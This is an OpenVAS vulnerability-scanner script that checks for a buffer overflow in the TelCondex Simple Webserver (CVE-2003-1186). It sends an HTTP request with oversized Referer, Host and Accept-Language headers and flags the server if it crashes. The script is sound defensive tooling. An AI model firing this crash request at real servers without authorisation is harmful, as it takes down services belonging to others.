# OpenVAS Vulnerability Test
# $Id: telcondex.nasl 12821 2018-12-18 12:37:20Z cfischer $
# Description: TelCondex Simple Webserver Buffer Overflow
#
# Authors:
# 2003 Matt North
#
# Copyright:
# Copyright (C) 2003 Matt North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11927");
  script_version("$Revision: 12821 $");
  script_tag(name:"last_modification", value:"$Date: 2018-12-18 13:37:20 +0100 (Tue, 18 Dec 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-1186");
  script_bugtraq_id(8925);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("TelCondex Simple Webserver Buffer Overflow");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2003 Matt North");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.yourinfosystem.de/download/TcSimpleWebServer2000Setup.exe");

  script_tag(name:"solution", value:"Upgrade to version 2.13.");

  script_tag(name:"summary", value:"The TelCondex SimpleWebserver is vulnerable to a remote executable
  buffer overflow, due to missing length check on the referer-variable of the HTTP-header.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);
if(http_is_dead(port:port)) exit(0);

s = string( "GET / HTTP/1.1\r\n",
            "Accept: */* \r\n" ,
            "Referer:", crap(704), "\r\n",
            "Host:" , crap(704), "\r\n",
            "Accept-Language",
            crap(704), "\r\n\r\n" );

soc =  http_open_socket(port);
if(!soc) exit(0);

send(socket: soc, data: s);
r = http_recv(socket: soc);
http_close_socket(soc);

if(http_is_dead(port: port)) {
  security_message(port: port);
}